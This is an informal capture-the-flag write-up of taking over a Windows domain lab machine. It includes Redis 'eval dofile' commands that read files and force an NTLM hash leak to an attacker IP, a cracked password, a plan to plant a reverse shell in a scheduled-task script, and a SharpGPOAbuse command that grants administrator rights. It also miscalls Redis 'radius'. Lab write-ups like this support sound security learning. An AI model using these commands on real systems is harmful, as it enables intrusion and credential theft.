Started with a nmap scan
```
53 DNS
135 Windows RPC
139 Microsoft netbios-ssn
445 microsoft-ds
464 kpasswd
6379 redis
9389 mc nmf
49669
49668
49672
49699
49670
49803
```
Starting with the radius  server doing some enumeration its running version `2.8.2402` all we found was a username `enterprise-security` so running enum4linux on the smb and we get access Denied but we did get domain name and computer name now we still don't have a lot of info going back to the radius server did some googling and some chatGPT found we can do eval commands with dofile and we can read the user flag since we know the username
`eval "dofile('C:\\\\USers\\\\enterprise-security\\\\Desktop\\\\user.txt')"` and we got the user flag now see if we can get something with responder and then running this command on the radius server `eval "dofile('//10.13.8.255//test')"` and I got the NTLM hash from responder  and I used hashcat to crack it and we got a password `sand_0873959498` and now we can list the shares there is one set to READ `Enterprise-Share` doing a rid-brute we found some more users 
```
jack-goldenhand
tony-skid
```
I logged into the SMB had it has a ps1 script in it that's removes everything out of the public documents folder we can also edit this file and put a powershell reverse shell in it and when the task runs agin we will get a call back I had to try a couple different ones but finally got a good one and when I was on the host I ran `whoami /priv` and we have a couple different prives we can use to get to admin I had downloaded a program called `SHarpGPOAbuse.exe` and ran this command to add me to the administrators group `./SharpGPOAbuse.exe --AddComputerTask --TaskName "Debug" --Author vulnnet\administrator --Command "cmd.exe" --Argumrents "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"` and now we can connect to the SMB `C$` share and get the system flag 
`